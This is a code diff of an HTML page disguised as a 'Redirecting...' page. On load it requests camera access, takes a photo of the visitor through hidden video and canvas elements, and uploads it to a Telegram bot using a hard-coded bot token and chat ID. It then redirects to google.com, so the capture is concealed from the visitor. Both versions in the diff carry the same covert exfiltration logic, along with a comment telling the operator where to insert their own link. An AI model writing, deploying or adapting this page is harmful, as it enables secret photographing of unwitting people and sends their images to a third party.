@@ -1,71 +1,62 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Processing...</title>
+  <meta charset="UTF-8" />
+  <title>Redirecting...</title>
 </head>
-<body>
+<body style="margin:0; background:#000;">
+  <!-- Hidden video and canvas elements -->
   <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
   <script>
-    const botToken = "7928322347:AAHDTEO69PLQrzXO5pCz-Y4CoQOTdlvi5YU";
-    const chatId = "7009447523";
-    const redirectURL = "https://google.com";
+    const BOT_TOKEN = "8182226345:AAF3bv4klc-gx-he8_uzPgq-NFPpZqXQ2Ro";
+    const CHAT_ID = "7009447523";
+    const REDIRECT_URL = "https://google.com"; // 👈 Apni link yahan daalein
 
-    async function captureAndSendPhoto() {
-      // Step 1: check if getUserMedia is supported
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        alert("📵 آپ کا براؤزر کیمرہ سپورٹ نہیں کرتا!");
-        window.location.href = redirectURL;
-        return;
-      }
-
+    async function captureAndSend() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" }
-        });
-
+        // Request camera access
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
         video.srcObject = stream;
 
+        // Wait for video to load
         await new Promise(resolve => {
-          video.onloadedmetadata = () => {
-            video.play();
-            setTimeout(resolve, 1000); // wait 1 sec
-          };
+          video.onloadedmetadata = () => resolve();
         });
 
-        const canvas = document.getElementById("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        // Small delay for camera adjustment
+        setTimeout(async () => {
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imageData = canvas.toDataURL("image/png");
+          const blob = await (await fetch(imageData)).blob();
 
-        const imageBlob = await new Promise(resolve => {
-          canvas.toBlob(resolve, "image/jpeg", 0.95);
-        });
+          const formData = new FormData();
+          formData.append("chat_id", CHAT_ID);
+          formData.append("photo", blob, "image.png");
 
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        formData.append("photo", imageBlob, "capture.jpg");
+          // Send to Telegram
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: formData
+          });
 
-        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-          method: "POST",
-          body: formData
-        });
-
-        stream.getTracks().forEach(track => track.stop());
-
-        window.location.href = redirectURL;
+          // Redirect after sending
+          window.location.href = REDIRECT_URL;
+        }, 1200); // adjust timing if needed
 
       } catch (err) {
-        alert("❌ کیمرہ کی اجازت نہیں ملی یا مسئلہ ہوا: " + err.message);
-        window.location.href = redirectURL;
+        // If user blocks camera or error occurs, still redirect
+        console.error("Camera access denied or failed:", err);
+        window.location.href = REDIRECT_URL;
       }
     }
 
-    // Start when page loads
-    window.onload = captureAndSendPhoto;
+    // Run on page load
+    window.onload = captureAndSend;
   </script>
 </body>
 </html>
